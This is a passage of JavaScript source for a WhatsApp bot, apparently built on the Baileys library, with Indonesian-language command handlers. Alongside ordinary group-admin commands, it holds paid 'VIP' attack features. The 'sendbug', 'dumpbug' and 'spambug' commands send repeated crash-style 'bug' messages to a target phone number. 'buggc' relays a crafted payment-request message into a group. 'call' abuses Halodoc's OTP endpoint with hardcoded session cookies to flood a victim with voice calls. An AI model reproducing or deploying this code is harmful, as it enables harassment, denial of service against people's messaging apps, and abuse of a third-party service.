if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [demote], "demote")
reply('Done!')
break

//©from: dennis × ivan
case 'sendbug':
if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
nd = dn.split("|")
if (Number(nd[1]) >= 100) return reply('Jumlah terlalu banyak!')
if (!Number(nd[1])) return reply(`Silahkan masukkan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
reply('Loading 3Second...')
for (let i = 0; i < nd[1]; i++){
await sleep(3000)
reply(`Berhasil mengirim ${Number(i) + 1} bug!`)
let sendbug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" })
await sleep(3000)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: sendbug.key })}
reply(`Sukses mengirim ${nd[1]} bug ke nomor ${nd[0]}`)
break

//©from: dennis × andik
case 'dumpbug':
if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply(`Sukses mengirim bug ke nomor ${dn}`)
break

//©from: dennis × ivan × andik
case 'spambug':
if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
reply('Berhasil mengirim 1 bug!')
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply('Loading 30Second...')
function delay30d(i) { setTimeout(() => {
reply(`Berhasil mengirim ${Number(i) + 2} bug!`)
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
delay30d(++i)}, 30000)}
delay30d(0)
break

//©from: dennis x haikal
case 'buggc':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
await sleep(3000)
await semar.groupLeave(from)
break

//©from: dennis
case 'autobug':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `autobug on`, buttonText: { displayText: "ON" }, type: 1},{ buttonId: `autobug off`, buttonText: { displayText: "OFF" }, type: 1}], {quoted:msg})
if (dn === 'on'){ autobug = true
reply('Sukses')
} else if (dn === 'off'){ autobug = false
reply('Sukses')} else { reply('Error')}
break

//©from: dennis x baileys
case '01':
sendButMessage(from, 'test', 'test', [{buttonId: `${prefix}01`, buttonText: {displayText: 'Button 1'}, type: 1},{buttonId: `${prefix}02`, buttonText: {displayText: 'Button 2'}, type: 1},{buttonId: `${prefix}03`, buttonText: {displayText: 'Button 3'}, type: 1}], {quoted:msg})
break

//©from: dennis x baileys
case '02':
sendButTemplate(from, 'test', 'test', [{index: 1, urlButton: {displayText: 'test', url: 'https://'}},{index: 2, callButton: {displayText: 'test', phoneNumber: '6285'}},{index: 3, quickReplyButton: {displayText: 'test', id: `0`}}])
break

//©from: dennis x baileys
case '03':
sendLstMessage(from, 'test', 'test', 'test', 'test', [{title: "Section 1",rows: [{title: "Option 1", rowId: "option1"},{title: "Option 2", rowId: "option2", description: "This is a description"}]},{title: "Section 2",rows: [{title: "Option 3", rowId: "option3"},{title: "Option 4", rowId: "option4", description: "This is a description V2"}]}])
break

//©from: dennis
case 'acc': case 'accept':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!dn) return reply('Invalid number')
userVIP.push(`${dn}@s.whatsapp.net`)
fs.writeFileSync('./storage/database/vip.json', JSON.stringify(`${userVIP}`))
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: `Halo, Nomor Anda Telah Diizinkan Oleh Owner Untuk Mengakses VIP!\nNomor : ${dn}\nWaktu : ${time}\nTerimakasih Telah Membeli Lisensi VIP!`})
reply(`Sukses Register ${dn}`)
break

//©from: dennis
case 'listvip':
reply(`${JSON.stringify(userVIP, null, 2)}`)
break

//©from: dennis
case 'chat':
if (!isDev && !isVIP && !msg.key.fromMe) return
if (!dn) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim pesan ke nomor ini!')
nd = dn.split("|")
if (!nd) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: `${nd[1]}` })
reply(`Sukses mengirim pesan ${nd[1]} ke nomor ${nd[0]}`)
break

//©from: dennis
case 'join':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await semar.groupAcceptInvite(result).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'leave':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
await semar.groupLeave(from).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'delete': case 'd': case 'del':
if (!isDev && !isVIP && !msg.key.fromMe) return
semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
break

//©from: dennis
case 'restart':
if (!isDev && !isVIP && !msg.key.fromMe) return
exec(`pm2 restart index`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis
case 'shutdown':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis × mr_dark
case 'call':
if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} +${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +${senderNumber}`)
if (args[0].startsWith('8')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +${senderNumber}`)
if (args[0].startsWith(`+${nomorDeveloper}`)) return reply('Tidak bisa call ke nomor developer!')
if (args[0].startsWith(`+${botNumber}`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${dn}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break

//©from: dennis
case 'public':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = true
reply('Sukses mengubah ke mode public')
break

//©from: dennis
case 'private': case 'self':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = false
reply('Sukses mengubah ke mode private')
break

//©from: dennis
case 'vote':
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({"pollCreationMessage": {
"name": "@dcodedenpa",
"options": [{
"optionName": "option 1"
},{
"optionName": "option 2"
},{
"optionName": "option 3"
}],
"selectableOptionsCount": 3}}), { userJid: from })
semar.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
break
default:
}} catch (e) {
console.log(e)
semar.sendMessage("6285866295942@s.whatsapp.net", {text:e})}}